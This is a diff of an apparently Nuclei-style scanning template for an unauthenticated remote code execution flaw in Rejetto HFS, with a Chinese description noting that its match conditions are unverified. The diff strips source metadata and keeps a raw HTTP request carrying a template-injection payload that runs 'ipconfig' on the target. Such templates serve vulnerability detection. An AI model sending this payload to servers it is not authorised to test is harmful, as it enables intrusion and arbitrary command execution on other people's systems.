@@ -3,14 +3,8 @@ info:
   name: Hfs  Rejetto HTTP文件服务器 未授权RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vrb88rcgqnb18czk
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vrb88rcgqnb18czk
-    fofa: app="HFS"
 http:
 - raw:
   - 'GET /?n=%0A&cmd=ipconfig&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
